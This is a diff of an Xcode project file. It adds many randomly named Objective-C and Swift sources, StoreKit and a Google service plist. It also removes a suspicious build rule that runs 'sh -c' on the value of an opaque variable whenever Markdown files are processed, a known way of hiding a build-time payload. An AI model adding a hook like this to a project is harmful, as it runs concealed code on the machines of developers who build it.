@@ -14,23 +14,79 @@
 		97C146FC1CF9000F007C117D /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 97C146FA1CF9000F007C117D /* Main.storyboard */; };
 		97C146FE1CF9000F007C117D /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 97C146FD1CF9000F007C117D /* Assets.xcassets */; };
 		97C147011CF9000F007C117D /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 97C146FF1CF9000F007C117D /* LaunchScreen.storyboard */; };
+		9EC8B9742ED58FF50060F700 /* StoreKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 9EC8B9732ED58FF50060F700 /* StoreKit.framework */; };
+		9EC8B9782ED5913E0060F700 /* CoherentDeliberate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9772ED591330060F700 /* CoherentDeliberate.swift */; };
+		9EC8B9ED2ED5917A0060F700 /* BackwardEphemeralSlider.bundle in Resources */ = {isa = PBXBuildFile; fileRef = 9EC8B97F2ED5917A0060F700 /* BackwardEphemeralSlider.bundle */; };
+		9EC8B9EE2ED5917A0060F700 /* ConvolutionActionValidation.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9872ED5917A0060F700 /* ConvolutionActionValidation.m */; };
+		9EC8B9EF2ED5917A0060F700 /* InteractiveCustomGrain.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9A32ED5917A0060F700 /* InteractiveCustomGrain.m */; };
+		9EC8B9F02ED5917A0060F700 /* TransformOldLoop.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9E32ED5917A0060F700 /* TransformOldLoop.m */; };
+		9EC8B9F12ED5917A0060F700 /* PublishHistogramInteractor.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9BB2ED5917A0060F700 /* PublishHistogramInteractor.m */; };
+		9EC8B9F22ED5917A0060F700 /* CompleterTraversalReference.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9832ED5917A0060F700 /* CompleterTraversalReference.m */; };
+		9EC8B9F32ED5917A0060F700 /* MobileProjectionCache.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9AD2ED5917A0060F700 /* MobileProjectionCache.m */; };
+		9EC8B9F42ED5917A0060F700 /* SequentialWorkflowListener.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9D32ED5917A0060F700 /* SequentialWorkflowListener.m */; };
+		9EC8B9F52ED5917A0060F700 /* EnabledProjectionSize.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9952ED5917A0060F700 /* EnabledProjectionSize.m */; };
+		9EC8B9F62ED5917A0060F700 /* DetachStreamShader.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B98D2ED5917A0060F700 /* DetachStreamShader.m */; };
+		9EC8B9F72ED5917A0060F700 /* DismissSpecifierAwait.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9912ED5917A0060F700 /* DismissSpecifierAwait.m */; };
+		9EC8B9F82ED5917A0060F700 /* UnderStoryboardObserver.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9E52ED5917A0060F700 /* UnderStoryboardObserver.m */; };
+		9EC8B9F92ED5917A0060F700 /* LoadPrecisionRect.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9A72ED5917A0060F700 /* LoadPrecisionRect.m */; };
+		9EC8B9FA2ED5917A0060F700 /* MaterialStatelessBase.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9AB2ED5917A0060F700 /* MaterialStatelessBase.m */; };
+		9EC8B9FB2ED5917A0060F700 /* SanitizeSpotBase.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9CF2ED5917A0060F700 /* SanitizeSpotBase.m */; };
+		9EC8B9FC2ED5917A0060F700 /* DesktopOccasionList.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9892ED5917A0060F700 /* DesktopOccasionList.m */; };
+		9EC8B9FD2ED5917A0060F700 /* ReplicaTierInteraction.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9C52ED5917A0060F700 /* ReplicaTierInteraction.m */; };
+		9EC8B9FE2ED5917A0060F700 /* FromCapacitiesStore.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9992ED5917A0060F700 /* FromCapacitiesStore.m */; };
+		9EC8B9FF2ED5917A0060F700 /* ValidateScaffoldTweak.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9EB2ED5917A0060F700 /* ValidateScaffoldTweak.m */; };
+		9EC8BA002ED5917A0060F700 /* FromInstructionLoop.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B99B2ED5917A0060F700 /* FromInstructionLoop.m */; };
+		9EC8BA012ED5917A0060F700 /* HeroCurveAdapter.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B99D2ED5917A0060F700 /* HeroCurveAdapter.m */; };
+		9EC8BA022ED5917A0060F700 /* RenameMapPresenter.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9C32ED5917A0060F700 /* RenameMapPresenter.m */; };
+		9EC8BA032ED5917A0060F700 /* StreamlineStepInformation.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9D72ED5917A0060F700 /* StreamlineStepInformation.m */; };
+		9EC8BA042ED5917A0060F700 /* PushChannelsScene.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9BD2ED5917A0060F700 /* PushChannelsScene.m */; };
+		9EC8BA052ED5917A0060F700 /* AcrossConvolutionDecoration.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B97A2ED5917A0060F700 /* AcrossConvolutionDecoration.m */; };
+		9EC8BA062ED5917A0060F700 /* ProjectKindMode.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9B92ED5917A0060F700 /* ProjectKindMode.m */; };
+		9EC8BA072ED5917A0060F700 /* ConsumerPhaseAlignment.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9852ED5917A0060F700 /* ConsumerPhaseAlignment.m */; };
+		9EC8BA082ED5917A0060F700 /* RestartRowGroup.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9CB2ED5917A0060F700 /* RestartRowGroup.m */; };
+		9EC8BA092ED5917A0060F700 /* SaveStepOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9D12ED5917A0060F700 /* SaveStepOperation.m */; };
+		9EC8BA0A2ED5917A0060F700 /* PersistentResourceRange.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9B72ED5917A0060F700 /* PersistentResourceRange.m */; };
+		9EC8BA0B2ED5917A0060F700 /* ToPreviewAnalyzer.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9DF2ED5917A0060F700 /* ToPreviewAnalyzer.m */; };
+		9EC8BA0C2ED5917A0060F700 /* QuantizationSequentialManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9BF2ED5917A0060F700 /* QuantizationSequentialManager.m */; };
+		9EC8BA0D2ED5917A0060F700 /* OnParticleEvaluation.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9B32ED5917A0060F700 /* OnParticleEvaluation.m */; };
+		9EC8BA0E2ED5917A0060F700 /* AgileBuilderRecursion.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B97E2ED5917A0060F700 /* AgileBuilderRecursion.m */; };
+		9EC8BA0F2ED5917A0060F700 /* RequestMusicCapacity.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9C72ED5917A0060F700 /* RequestMusicCapacity.m */; };
+		9EC8BA102ED5917A0060F700 /* IntoWorkflowInfrastructure.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9A52ED5917A0060F700 /* IntoWorkflowInfrastructure.m */; };
+		9EC8BA112ED5917A0060F700 /* ObtainSymbolSound.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9AF2ED5917A0060F700 /* ObtainSymbolSound.m */; };
+		9EC8BA122ED5917A0060F700 /* RebuildBaselineInstance.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9C12ED5917A0060F700 /* RebuildBaselineInstance.m */; };
+		9EC8BA132ED5917A0060F700 /* TouchTernaryAdapter.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9E12ED5917A0060F700 /* TouchTernaryAdapter.m */; };
+		9EC8BA142ED5917A0060F700 /* TextfieldPresenterExtension.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9DB2ED5917A0060F700 /* TextfieldPresenterExtension.m */; };
+		9EC8BA152ED5917A0060F700 /* UnmountFixedMonster.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9E72ED5917A0060F700 /* UnmountFixedMonster.m */; };
+		9EC8BA162ED5917A0060F700 /* HyperbolicTickerHandler.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9A12ED5917A0060F700 /* HyperbolicTickerHandler.m */; };
+		9EC8BA172ED5917A0060F700 /* UpdateContractionDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9E92ED5917A0060F700 /* UpdateContractionDelegate.m */; };
+		9EC8BA182ED5917A0060F700 /* DetachMapCoordinator.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B98B2ED5917A0060F700 /* DetachMapCoordinator.m */; };
+		9EC8BA192ED5917A0060F700 /* EqualBitrateHelper.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9972ED5917A0060F700 /* EqualBitrateHelper.m */; };
+		9EC8BA1A2ED5917A0060F700 /* OffChecklistAnimation.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9B12ED5917A0060F700 /* OffChecklistAnimation.m */; };
+		9EC8BA1B2ED5917A0060F700 /* DisconnectButtonNode.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B98F2ED5917A0060F700 /* DisconnectButtonNode.m */; };
+		9EC8BA1C2ED5917A0060F700 /* OntoRemainderLayer.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9B52ED5917A0060F700 /* OntoRemainderLayer.m */; };
+		9EC8BA1D2ED5917A0060F700 /* DropoutOptimizerEvent.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9932ED5917A0060F700 /* DropoutOptimizerEvent.m */; };
+		9EC8BA1E2ED5917A0060F700 /* ActivateAxisFrame.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B97C2ED5917A0060F700 /* ActivateAxisFrame.m */; };
+		9EC8BA1F2ED5917A0060F700 /* SoundValueType.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9D52ED5917A0060F700 /* SoundValueType.m */; };
+		9EC8BA202ED5917A0060F700 /* TernaryDispatcherCollection.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9D92ED5917A0060F700 /* TernaryDispatcherCollection.m */; };
+		9EC8BA212ED5917A0060F700 /* LostAssetStrength.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9A92ED5917A0060F700 /* LostAssetStrength.m */; };
+		9EC8BA222ED5917A0060F700 /* ResourceTierResponse.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9C92ED5917A0060F700 /* ResourceTierResponse.m */; };
+		9EC8BA232ED5917A0060F700 /* HierarchicalSecondCurve.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B99F2ED5917A0060F700 /* HierarchicalSecondCurve.m */; };
+		9EC8BA242ED5917A0060F700 /* TextJobTransparency.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9DD2ED5917A0060F700 /* TextJobTransparency.m */; };
+		9EC8BA252ED5917A0060F700 /* RouterEvolutionDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9CD2ED5917A0060F700 /* RouterEvolutionDelegate.m */; };
+		9EC8BA262ED5917A0060F700 /* CacheChannelsGrid.m in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9812ED5917A0060F700 /* CacheChannelsGrid.m */; };
+		9EC8BA322ED595270060F700 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 9EC8BA2A2ED595270060F700 /* GoogleService-Info.plist */; };
+		9EC8BA332ED595270060F700 /* DeepDelegateHandler.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8BA282ED595270060F700 /* DeepDelegateHandler.swift */; };
+		9EC8BA342ED595270060F700 /* DelegateFormLeft.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8BA292ED595270060F700 /* DelegateFormLeft.swift */; };
+		9EC8BA352ED595270060F700 /* SmallIsolateState.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8BA2F2ED595270060F700 /* SmallIsolateState.swift */; };
+		9EC8BA362ED595270060F700 /* MethodBoundaryRequestDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8BA2D2ED595270060F700 /* MethodBoundaryRequestDelegate.swift */; };
+		9EC8BA372ED595270060F700 /* LacunaDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8BA2B2ED595270060F700 /* LacunaDelegate.swift */; };
+		9EC8BA382ED595270060F700 /* LocalTransitionPosition.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8BA2C2ED595270060F700 /* LocalTransitionPosition.swift */; };
+		9EC8BA392ED595270060F700 /* TensorCurveVelocity.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8BA302ED595270060F700 /* TensorCurveVelocity.swift */; };
+		9EC8BA3A2ED595270060F700 /* WidgetOfDecorator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8BA312ED595270060F700 /* WidgetOfDecorator.swift */; };
+		9EC8BA3B2ED595270060F700 /* RectActivityContrast.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8BA2E2ED595270060F700 /* RectActivityContrast.swift */; };
+		9EC8BA3C2ED595270060F700 /* AllocatorViaVariable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8BA272ED595270060F700 /* AllocatorViaVariable.swift */; };
+		9EC8BA3D2ED59D610060F700 /* AmbiguousBenevolent.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9EC8B9762ED590EA0060F700 /* AmbiguousBenevolent.swift */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		117A69CF7B8B465085A389E6 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A6E983A}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXCopyFilesBuildPhase section */
 		9705A1C41CF9048500538489 /* Embed Frameworks */ = {
@@ -63,6 +119,136 @@
 		97C146FD1CF9000F007C117D /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		97C147001CF9000F007C117D /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		97C147021CF9000F007C117D /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		9EC8B9732ED58FF50060F700 /* StoreKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = StoreKit.framework; path = System/Library/Frameworks/StoreKit.framework; sourceTree = SDKROOT; };
+		9EC8B9752ED58FF80060F700 /* Runner.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = Runner.entitlements; sourceTree = "<group>"; };
+		9EC8B9762ED590EA0060F700 /* AmbiguousBenevolent.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AmbiguousBenevolent.swift; sourceTree = "<group>"; };
+		9EC8B9772ED591330060F700 /* CoherentDeliberate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CoherentDeliberate.swift; sourceTree = "<group>"; };
+		9EC8B9792ED5917A0060F700 /* AcrossConvolutionDecoration.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AcrossConvolutionDecoration.h; sourceTree = "<group>"; };
+		9EC8B97A2ED5917A0060F700 /* AcrossConvolutionDecoration.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AcrossConvolutionDecoration.m; sourceTree = "<group>"; };
+		9EC8B97B2ED5917A0060F700 /* ActivateAxisFrame.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ActivateAxisFrame.h; sourceTree = "<group>"; };
+		9EC8B97C2ED5917A0060F700 /* ActivateAxisFrame.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ActivateAxisFrame.m; sourceTree = "<group>"; };
+		9EC8B97D2ED5917A0060F700 /* AgileBuilderRecursion.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AgileBuilderRecursion.h; sourceTree = "<group>"; };
+		9EC8B97E2ED5917A0060F700 /* AgileBuilderRecursion.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AgileBuilderRecursion.m; sourceTree = "<group>"; };
+		9EC8B97F2ED5917A0060F700 /* BackwardEphemeralSlider.bundle */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.plug-in"; path = BackwardEphemeralSlider.bundle; sourceTree = "<group>"; };
+		9EC8B9802ED5917A0060F700 /* CacheChannelsGrid.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CacheChannelsGrid.h; sourceTree = "<group>"; };
+		9EC8B9812ED5917A0060F700 /* CacheChannelsGrid.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = CacheChannelsGrid.m; sourceTree = "<group>"; };
+		9EC8B9822ED5917A0060F700 /* CompleterTraversalReference.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CompleterTraversalReference.h; sourceTree = "<group>"; };
+		9EC8B9832ED5917A0060F700 /* CompleterTraversalReference.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = CompleterTraversalReference.m; sourceTree = "<group>"; };
+		9EC8B9842ED5917A0060F700 /* ConsumerPhaseAlignment.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ConsumerPhaseAlignment.h; sourceTree = "<group>"; };
+		9EC8B9852ED5917A0060F700 /* ConsumerPhaseAlignment.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ConsumerPhaseAlignment.m; sourceTree = "<group>"; };
+		9EC8B9862ED5917A0060F700 /* ConvolutionActionValidation.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ConvolutionActionValidation.h; sourceTree = "<group>"; };
+		9EC8B9872ED5917A0060F700 /* ConvolutionActionValidation.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ConvolutionActionValidation.m; sourceTree = "<group>"; };
+		9EC8B9882ED5917A0060F700 /* DesktopOccasionList.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DesktopOccasionList.h; sourceTree = "<group>"; };
+		9EC8B9892ED5917A0060F700 /* DesktopOccasionList.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DesktopOccasionList.m; sourceTree = "<group>"; };
+		9EC8B98A2ED5917A0060F700 /* DetachMapCoordinator.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DetachMapCoordinator.h; sourceTree = "<group>"; };
+		9EC8B98B2ED5917A0060F700 /* DetachMapCoordinator.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DetachMapCoordinator.m; sourceTree = "<group>"; };
+		9EC8B98C2ED5917A0060F700 /* DetachStreamShader.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DetachStreamShader.h; sourceTree = "<group>"; };
+		9EC8B98D2ED5917A0060F700 /* DetachStreamShader.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DetachStreamShader.m; sourceTree = "<group>"; };
+		9EC8B98E2ED5917A0060F700 /* DisconnectButtonNode.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DisconnectButtonNode.h; sourceTree = "<group>"; };
+		9EC8B98F2ED5917A0060F700 /* DisconnectButtonNode.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DisconnectButtonNode.m; sourceTree = "<group>"; };
+		9EC8B9902ED5917A0060F700 /* DismissSpecifierAwait.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DismissSpecifierAwait.h; sourceTree = "<group>"; };
+		9EC8B9912ED5917A0060F700 /* DismissSpecifierAwait.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DismissSpecifierAwait.m; sourceTree = "<group>"; };
+		9EC8B9922ED5917A0060F700 /* DropoutOptimizerEvent.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DropoutOptimizerEvent.h; sourceTree = "<group>"; };
+		9EC8B9932ED5917A0060F700 /* DropoutOptimizerEvent.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DropoutOptimizerEvent.m; sourceTree = "<group>"; };
+		9EC8B9942ED5917A0060F700 /* EnabledProjectionSize.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = EnabledProjectionSize.h; sourceTree = "<group>"; };
+		9EC8B9952ED5917A0060F700 /* EnabledProjectionSize.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = EnabledProjectionSize.m; sourceTree = "<group>"; };
+		9EC8B9962ED5917A0060F700 /* EqualBitrateHelper.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = EqualBitrateHelper.h; sourceTree = "<group>"; };
+		9EC8B9972ED5917A0060F700 /* EqualBitrateHelper.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = EqualBitrateHelper.m; sourceTree = "<group>"; };
+		9EC8B9982ED5917A0060F700 /* FromCapacitiesStore.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FromCapacitiesStore.h; sourceTree = "<group>"; };
+		9EC8B9992ED5917A0060F700 /* FromCapacitiesStore.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = FromCapacitiesStore.m; sourceTree = "<group>"; };
+		9EC8B99A2ED5917A0060F700 /* FromInstructionLoop.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FromInstructionLoop.h; sourceTree = "<group>"; };
+		9EC8B99B2ED5917A0060F700 /* FromInstructionLoop.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = FromInstructionLoop.m; sourceTree = "<group>"; };
+		9EC8B99C2ED5917A0060F700 /* HeroCurveAdapter.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = HeroCurveAdapter.h; sourceTree = "<group>"; };
+		9EC8B99D2ED5917A0060F700 /* HeroCurveAdapter.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = HeroCurveAdapter.m; sourceTree = "<group>"; };
+		9EC8B99E2ED5917A0060F700 /* HierarchicalSecondCurve.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = HierarchicalSecondCurve.h; sourceTree = "<group>"; };
+		9EC8B99F2ED5917A0060F700 /* HierarchicalSecondCurve.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = HierarchicalSecondCurve.m; sourceTree = "<group>"; };
+		9EC8B9A02ED5917A0060F700 /* HyperbolicTickerHandler.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = HyperbolicTickerHandler.h; sourceTree = "<group>"; };
+		9EC8B9A12ED5917A0060F700 /* HyperbolicTickerHandler.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = HyperbolicTickerHandler.m; sourceTree = "<group>"; };
+		9EC8B9A22ED5917A0060F700 /* InteractiveCustomGrain.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = InteractiveCustomGrain.h; sourceTree = "<group>"; };
+		9EC8B9A32ED5917A0060F700 /* InteractiveCustomGrain.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = InteractiveCustomGrain.m; sourceTree = "<group>"; };
+		9EC8B9A42ED5917A0060F700 /* IntoWorkflowInfrastructure.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = IntoWorkflowInfrastructure.h; sourceTree = "<group>"; };
+		9EC8B9A52ED5917A0060F700 /* IntoWorkflowInfrastructure.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = IntoWorkflowInfrastructure.m; sourceTree = "<group>"; };
+		9EC8B9A62ED5917A0060F700 /* LoadPrecisionRect.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LoadPrecisionRect.h; sourceTree = "<group>"; };
+		9EC8B9A72ED5917A0060F700 /* LoadPrecisionRect.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = LoadPrecisionRect.m; sourceTree = "<group>"; };
+		9EC8B9A82ED5917A0060F700 /* LostAssetStrength.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LostAssetStrength.h; sourceTree = "<group>"; };
+		9EC8B9A92ED5917A0060F700 /* LostAssetStrength.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = LostAssetStrength.m; sourceTree = "<group>"; };
+		9EC8B9AA2ED5917A0060F700 /* MaterialStatelessBase.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MaterialStatelessBase.h; sourceTree = "<group>"; };
+		9EC8B9AB2ED5917A0060F700 /* MaterialStatelessBase.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MaterialStatelessBase.m; sourceTree = "<group>"; };
+		9EC8B9AC2ED5917A0060F700 /* MobileProjectionCache.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MobileProjectionCache.h; sourceTree = "<group>"; };
+		9EC8B9AD2ED5917A0060F700 /* MobileProjectionCache.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MobileProjectionCache.m; sourceTree = "<group>"; };
+		9EC8B9AE2ED5917A0060F700 /* ObtainSymbolSound.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ObtainSymbolSound.h; sourceTree = "<group>"; };
+		9EC8B9AF2ED5917A0060F700 /* ObtainSymbolSound.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ObtainSymbolSound.m; sourceTree = "<group>"; };
+		9EC8B9B02ED5917A0060F700 /* OffChecklistAnimation.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = OffChecklistAnimation.h; sourceTree = "<group>"; };
+		9EC8B9B12ED5917A0060F700 /* OffChecklistAnimation.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = OffChecklistAnimation.m; sourceTree = "<group>"; };
+		9EC8B9B22ED5917A0060F700 /* OnParticleEvaluation.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = OnParticleEvaluation.h; sourceTree = "<group>"; };
+		9EC8B9B32ED5917A0060F700 /* OnParticleEvaluation.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = OnParticleEvaluation.m; sourceTree = "<group>"; };
+		9EC8B9B42ED5917A0060F700 /* OntoRemainderLayer.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = OntoRemainderLayer.h; sourceTree = "<group>"; };
+		9EC8B9B52ED5917A0060F700 /* OntoRemainderLayer.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = OntoRemainderLayer.m; sourceTree = "<group>"; };
+		9EC8B9B62ED5917A0060F700 /* PersistentResourceRange.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PersistentResourceRange.h; sourceTree = "<group>"; };
+		9EC8B9B72ED5917A0060F700 /* PersistentResourceRange.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PersistentResourceRange.m; sourceTree = "<group>"; };
+		9EC8B9B82ED5917A0060F700 /* ProjectKindMode.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ProjectKindMode.h; sourceTree = "<group>"; };
+		9EC8B9B92ED5917A0060F700 /* ProjectKindMode.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ProjectKindMode.m; sourceTree = "<group>"; };
+		9EC8B9BA2ED5917A0060F700 /* PublishHistogramInteractor.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PublishHistogramInteractor.h; sourceTree = "<group>"; };
+		9EC8B9BB2ED5917A0060F700 /* PublishHistogramInteractor.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PublishHistogramInteractor.m; sourceTree = "<group>"; };
+		9EC8B9BC2ED5917A0060F700 /* PushChannelsScene.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PushChannelsScene.h; sourceTree = "<group>"; };
+		9EC8B9BD2ED5917A0060F700 /* PushChannelsScene.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PushChannelsScene.m; sourceTree = "<group>"; };
